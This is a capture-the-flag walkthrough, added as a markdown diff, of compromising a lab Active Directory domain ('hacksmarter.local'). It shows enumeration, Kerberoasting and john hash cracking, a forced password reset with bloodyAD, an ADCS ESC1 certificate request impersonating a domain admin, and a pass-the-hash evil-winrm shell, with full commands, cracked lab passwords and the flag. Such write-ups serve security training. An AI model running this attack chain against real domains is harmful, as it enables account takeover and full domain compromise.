@@ -1,0 +1,363 @@
+# Enumeration
+
+## NMAP
+
+```fortran
+Not shown: 987 filtered tcp ports (no-response)
+PORT     STATE SERVICE       REASON          VERSION
+53/tcp   open  domain        syn-ack ttl 126 Simple DNS Plus
+88/tcp   open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-04-25 14:33:10Z)
+135/tcp  open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
+139/tcp  open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
+389/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC01.hacksmarter.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
+| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-09-21T15:35:32
+| Not valid after:  2026-09-21T15:35:32
+| MD5:     fae9 1340 b0a8 16fc 0420 5560 a2c9 6fed
+| SHA-1:   affe d211 3720 65b4 1ee7 d8da 1a58 6825 5903 d150
+| SHA-256: f90f 862f 3c3e 8a53 9e9c 35b8 cfa3 a75a 9121 4ad0 0e43 d847 2d6f 6faf 9817 a749
+
+445/tcp  open  microsoft-ds? syn-ack ttl 126
+464/tcp  open  kpasswd5?     syn-ack ttl 126
+593/tcp  open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.hacksmarter.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
+| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-09-21T15:35:32
+| Not valid after:  2026-09-21T15:35:32
+| MD5:     fae9 1340 b0a8 16fc 0420 5560 a2c9 6fed
+| SHA-1:   affe d211 3720 65b4 1ee7 d8da 1a58 6825 5903 d150
+| SHA-256: f90f 862f 3c3e 8a53 9e9c 35b8 cfa3 a75a 9121 4ad0 0e43 d847 2d6f 6faf 9817 a749
+
+|_ssl-date: TLS randomness does not represent time
+3268/tcp open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC01.hacksmarter.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
+| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-09-21T15:35:32
+| Not valid after:  2026-09-21T15:35:32
+| MD5:     fae9 1340 b0a8 16fc 0420 5560 a2c9 6fed
+| SHA-1:   affe d211 3720 65b4 1ee7 d8da 1a58 6825 5903 d150
+| SHA-256: f90f 862f 3c3e 8a53 9e9c 35b8 cfa3 a75a 9121 4ad0 0e43 d847 2d6f 6faf 9817 a749
+
+3269/tcp open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hacksmarter.local, Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC01.hacksmarter.local
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.hacksmarter.local
+| Issuer: commonName=hacksmarter-DC01-CA/domainComponent=hacksmarter
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2025-09-21T15:35:32
+| Not valid after:  2026-09-21T15:35:32
+| MD5:     fae9 1340 b0a8 16fc 0420 5560 a2c9 6fed
+| SHA-1:   affe d211 3720 65b4 1ee7 d8da 1a58 6825 5903 d150
+| SHA-256: f90f 862f 3c3e 8a53 9e9c 35b8 cfa3 a75a 9121 4ad0 0e43 d847 2d6f 6faf 9817 a749
+| 
+| rdp-ntlm-info: 
+|   Target_Name: HACKSMARTER
+|   NetBIOS_Domain_Name: HACKSMARTER
+|   NetBIOS_Computer_Name: DC01
+|   DNS_Domain_Name: hacksmarter.local
+|   DNS_Computer_Name: DC01.hacksmarter.local
+|   Product_Version: 10.0.20348
+|_  System_Time: 2026-04-25T14:34:01+00:00
+5985/tcp open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-title: Not Found
+|_http-server-header: Microsoft-HTTPAPI/2.0
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
+No OS matches for host
+TCP/IP fingerprint:
+SCAN(V=7.99%E=4%D=4/25%OT=53%CT=%CU=%PV=Y%DS=3%DC=T%G=N%TM=69ECD103%P=x86_64-pc-linux-gnu)
+SEQ(SP=102%GCD=1%ISR=109%TI=I%TS=A)
+SEQ(SP=FC%GCD=1%ISR=100%TI=I%TS=A)
+OPS(O1=M510NW8ST11%O2=M510NW8ST11%O3=M510NW8NNT11%O4=M510NW8ST11%O5=M510NW8ST11%O6=M510ST11)
+WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFDC)
+ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M510NW8NNS%CC=Y%Q=)
+T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
+T2(R=N)
+T3(R=N)
+T4(R=N)
+U1(R=N)
+IE(R=N)
+
+Uptime guess: 0.004 days (since Sat Apr 25 14:28:40 2026)
+Network Distance: 3 hops
+TCP Sequence Prediction: Difficulty=258 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2026-04-25T14:34:01
+|_  start_date: N/A
+|_clock-skew: mean: -1s, deviation: 0s, median: -1s
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled and required
+| p2p-conficker: 
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 62194/tcp): CLEAN (Timeout)
+|   Check 2 (port 51700/tcp): CLEAN (Timeout)
+|   Check 3 (port 34393/udp): CLEAN (Timeout)
+|   Check 4 (port 57300/udp): CLEAN (Timeout)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
+
+TRACEROUTE (using port 53/tcp)
+HOP RTT       ADDRESS
+1   168.24 ms 10.200.0.1
+2   ...
+3   170.92 ms hacksmarter.local (10.1.171.27)
+```
+
+## NetExec User Enumeration
+
+```fortran
+└─# nxc smb 10.1.171.27 -u faraday -p hacksmarter123 --users                           
+SMB         10.1.171.27     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:hacksmarter.local) (signing:True) (SMBv1:None) (Null Auth:True)                                                                                                                                             
+SMB         10.1.171.27     445    DC01             [+] hacksmarter.local\faraday:hacksmarter123 
+SMB         10.1.171.27     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-                                   
+SMB         10.1.171.27     445    DC01             Administrator                 2025-09-18 22:40:20 0       Built-in account for administering the computer/domain                                                                                                                                                        
+SMB         10.1.171.27     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain                                                                                                                                                      
+SMB         10.1.171.27     445    DC01             krbtgt                        2025-09-21 02:51:44 0       Key Distribution Center Service Account 
+SMB         10.1.171.27     445    DC01             Goro                          2025-09-21 15:00:31 0       Loyal to a fault 
+SMB         10.1.171.27     445    DC01             alt.svc                       2025-09-21 15:07:42 0       Trapped for eternity 
+SMB         10.1.171.27     445    DC01             Yorinobu                      2026-04-17 13:30:41 0        
+SMB         10.1.171.27     445    DC01             Hanako                        2025-09-21 14:59:03 0       Waiting at embers 
+SMB         10.1.171.27     445    DC01             Faraday                       2025-09-21 15:06:45 0        
+SMB         10.1.171.27     445    DC01             Smasher                       2025-09-21 15:01:20 0        
+SMB         10.1.171.27     445    DC01             Soulkiller.svc                2025-09-21 15:30:13 0       Certificate managment for soulkiller AI 
+SMB         10.1.171.27     445    DC01             Hellman                       2025-09-21 15:04:19 0        
+SMB         10.1.171.27     445    DC01             kei.svc                       2025-09-21 15:05:16 0       Trapped for eternity 
+SMB         10.1.171.27     445    DC01             Silverhand.svc                2025-09-21 15:03:10 0       Trapped for eternity 
+SMB         10.1.171.27     445    DC01             Oda                           2025-09-21 15:02:14 0        
+SMB         10.1.171.27     445    DC01             the_emperor                   2025-11-06 17:19:03 0        
+SMB         10.1.171.27     445    DC01             [*] Enumerated 15 local users: HACKSMARTER
+```
+
+### Discovered Users
+
+```fortran
+Administrator
+Guest
+krbtgt
+Goro
+alt.svc
+Yorinobu
+Hanako
+Faraday
+Smasher
+Soulkiller.svc
+Hellman
+kei.svc
+Silverhand.svc
+Oda
+the_emperor
+```
+
+## Kerberostable user found
+
+```fortran
+└─# ./GetUserSPNs.py hacksmarter.local/faraday:'hacksmarter123' -dc-ip 10.1.171.27                     
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+ServicePrincipalName            Name     MemberOf  PasswordLastSet             LastLogon                   Delegation 
+------------------------------  -------  --------  --------------------------  --------------------------  ----------
+AI/blackwall.hacksmarter.local  alt.svc            2025-09-21 15:07:42.894050  2026-04-17 13:47:56.116856
+```
+
+### Password cracking for the user `alt.svc`
+
+```fortran
+alt.svc : babygirl1
+```
+
+## BloodHound Analysis
+
+![image.png](attachment:9a35bea7-7e60-4791-aa07-43a43992ac14:image.png)
+
+### Lateral Movement
+
+→ Changing `YORINOBU` password. 
+
+```fortran
+ bloodyAD --host "10.1.171.27" -d "hacksmarter.local" -u "alt.svc" -p "babygirl1" set password 'YORINOBU' 'ghost_sec009'
+[+] Password changed successfully!
+```
+
+→ We can perform TargetedKerberost against `SOULKILLER.svc` since `YORINOBU` has `GenericWrites` to that user. 
+
+```fortran
+python3 targetedKerberoast.py --dc-host DC01.hacksmarter.local -d hacksmarter.local -u yorinobu -p 'ghost_sec009' -f john 
+[*] Starting kerberoast attacks
+[*] Fetching usernames from Active Directory with LDAP
+```
+
+```fortran
+[+] Printing hash for (Soulkiller.svc)
+Soulkiller.svc:$krb5tgs$23$*Soulkiller.svc$HACKSMARTER.LOCAL$hacksmarter.local/Soulkiller.svc*$e17fe21752980589707c598f9d7e4d1c$92a3cb0bc1696e82cf88130d77d32e1bc8464e535811411c474478275584114d26219999636c9b5be4b4af5ca72c57bda1a7c8912f80d692c40e9e9ce1e23a425c564113a508534baca277825eecab82bb139fa9a707967437a4e664bcdc266815da6207603e3668515bf6841a56bdb069086f1ee92af173fb99bddc86dd8b8bff18e64ce631444e38a796b6ad1000e72aaf6b911d51bd149eb09bd3ef43c99a259bc08760c26982532475ec5c4ee52126046acb39bd6e40b918b7294485198f0744dd77aa12045fc63095b98047a3e58ee75bbd70cddb937aa0d1fdbc5ad1c50c5f2edd74d6799d9d4d4e7aa98bdec913b385b49e658e77fa70ebc3bb241142f5031ddb189afa8ecaa241d1562fe114f3f5110d878ea857c16056a0532f8f294318ce32a33df460dc883098e86e2ba2c699f731975aa076fa6232047d63a4142ccd6e7283682249d41ff5ee9003f02b6c93a7124c0530d7080a005a3c2a934255836201ccf56d975e3f743474fb874e257ddf88c947283b284506e693ed80d7b5893b73d9c46a56111379222e7802b8c81f7e4881c50b54fe09597b7ab46ff9a31263c55bc053c354efc488e600389871b5b899e66475514b25305d8442006dc2616605eb51423e520e032872e983c65ca7d8dbd58bcd8fd817e2e01ddb11e457d1072c8a23fba5463ee49361fe073851099d5191fdd51f8a2b1e4280b32a63a3437ce8e6c18c6cf9d582474424742f9a7ff2532db1b91c0d0d3ea1b7e37155c0e447b68e7f6149a1f3a137e97b92375dde6b5f5fe1bd5efd36978d98185f1ef2fc4c389b91319f7d576d25ee0787b464d83780cd00f286514334484577b18800942506e3889f78ee8214c42165bbc32adf6476314e71a87cd87531af6e72d45778dd206da1f157a4b3300569e67fbdc31b7ccb5d043e6b167b422ccde35021963476988ac4cda1b6b487ec4e9f1ab76132651b60bb5c8a734c5c0875e5c642e1aeba23a8e4826f4f94c3e5e9890974da8e0b5c6a573f8680429af71b46302bd651e252f5fee97e338de0295eca939dea370f52805d0cb41b4480a6d929e12ab7554f098e4331461bd5795e70d0fc159ee3eaa68df6382e7f2f8e8d9b6f487b3ee327f5c27980279f3844c6775552845a3860901b8fa641e0e482f1944b2721396f0a685908530f5bf6c5cd8ba6b55089aaffdea40cf5e810b9cae58daa03ee5650f5a906cb18d3f6a38e2e9adf9358b413885bf54ac50862ca2b5095a9e4c7f8bec006e9f21843a8d9feed202e686c2be2271f7c037178f7a35749f09b8b231a55dd3e4a8db4a54262d8143691599e34c8fbfde689e6682504e26fcf2b000cd48141f778c7178e983934e48df53384c77d838789b738f752ff361baf1ccdbf2d3758a8995930d9fd73fb3f268db0b12185557cee9b0e59df66a902118736549a15e1d8fdb0f38e938bb5bde89864ca5f74b486ee0e38bc413ada8d483a8304ddebce82c630de15ea771cc5d0a80029eb58d37b3d23a1532783da49c9eef2b6122e17b478c71e7b1a342af9776aacd56b70
+```
+
+### Cracking `SOULKILLER.svc` password
+
+```fortran
+└─# john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 12 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+MYpassword123#   (Soulkiller.svc)
+```
+
+```fortran
+SOULKILLER.svc : MYpassword123# 
+```
+
+## ADCS Attack
+
+![image.png](attachment:6536e111-1245-4d31-b9b5-c2a22c82f9ee:image.png)
+
+```fortran
+certipy-ad find -u 'SOULKILLER.svc@hacksmarter.local' -p 'MYpassword123#' -dc-ip 10.1.171.27 -stdout
+```
+
+```fortran
+Certificate Authorities
+  0
+    CA Name                             : hacksmarter-DC01-CA
+    DNS Name                            : DC01.hacksmarter.local
+    Certificate Subject                 : CN=hacksmarter-DC01-CA, DC=hacksmarter, DC=local
+    Certificate Serial Number           : 1DBC9F9ECF287FB04FDE66106578611F
+    Certificate Validity Start          : 2025-09-21 15:32:14+00:00
+    Certificate Validity End            : 2030-09-21 15:42:14+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : HACKSMARTER.LOCAL\Administrators
+      Access Rights
+        ManageCa                        : HACKSMARTER.LOCAL\Administrators
+                                          HACKSMARTER.LOCAL\Domain Admins
+                                          HACKSMARTER.LOCAL\Enterprise Admins
+        ManageCertificates              : HACKSMARTER.LOCAL\Administrators
+                                          HACKSMARTER.LOCAL\Domain Admins
+                                          HACKSMARTER.LOCAL\Enterprise Admins
+        Enroll                          : HACKSMARTER.LOCAL\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : AI_Takeover
+    Display Name                        : AI_Takeover
+    Certificate Authorities             : hacksmarter-DC01-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : IncludeSymmetricAlgorithms
+                                          PublishToDs
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Client Authentication
+                                          Secure Email
+                                          Encrypting File System
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 2048
+    Template Created                    : 2025-09-21T16:16:36+00:00
+    Template Last Modified              : 2025-09-21T16:16:36+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : HACKSMARTER.LOCAL\Soulkiller.svc
+                                          HACKSMARTER.LOCAL\Domain Admins
+                                          HACKSMARTER.LOCAL\Enterprise Admins
+      Object Control Permissions
+        Owner                           : HACKSMARTER.LOCAL\Administrator
+        Full Control Principals         : HACKSMARTER.LOCAL\Domain Admins
+                                          HACKSMARTER.LOCAL\Enterprise Admins
+        Write Owner Principals          : HACKSMARTER.LOCAL\Domain Admins
+                                          HACKSMARTER.LOCAL\Enterprise Admins
+        Write Dacl Principals           : HACKSMARTER.LOCAL\Domain Admins
+                                          HACKSMARTER.LOCAL\Enterprise Admins
+        Write Property Enroll           : HACKSMARTER.LOCAL\Domain Admins
+                                          HACKSMARTER.LOCAL\Enterprise Admins
+    [+] User Enrollable Principals      : HACKSMARTER.LOCAL\Soulkiller.svc
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+```
+
+### Vulnerable to ESC1 Attack
+
+```fortran
+ certipy-ad req -u 'SOULKILLER.svc@hacksmarter.local' -p "MYpassword123#" -dc-ip "10.1.171.27" -ca 'hacksmarter-DC01-CA' -template 'AI_Takeover' -upn 'THE_EMPEROR' -target 'DC01.hacksmarter.local' -key-size 4096
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Requesting certificate via RPC
+[*] Request ID is 7
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'THE_EMPEROR'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'the_emperor.pfx'
+[*] Wrote certificate and private key to 'the_emperor.pfx
+```
+
+```fortran
+┌──(root㉿vbox)-[/home/ghost_sec009/hsm/arasaka]
+└─# export KRB5CCNAME=THE_EMPEROR@10.1.171.27.ccache 
+                                                                                                                                                              
+┌──(root㉿vbox)-[/home/ghost_sec009/hsm/arasaka]
+└─# klist
+Ticket cache: FILE:THE_EMPEROR@10.1.171.27.ccache
+Default principal: THE_EMPEROR@HACKSMARTER.LOCAL
+
+Valid starting     Expires            Service principal
+17/04/26 14:18:09  18/04/26 00:18:09  krbtgt/HACKSMARTER.LOCAL@HACKSMARTER.LOCAL
+        renew until 18/04/26 14:18:08
+```
+
+## `The_EMPEROR` compromised - Domain Admin
+
+```fortran
+┌──(root㉿vbox)-[/home/ghost_sec009/hsm/arasaka]
+└─# evil-winrm -u THE_EMPEROR -H 'd87640b0d83dc7f90f5f30bd6789b133' -i 10.1.171.27
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\the_emperor\Documents> 
+
+```
+
+# ROOT FLAG
+
+```fortran
+fcf1dd0f08d1068a2f151fd2ec5ecf05
+```
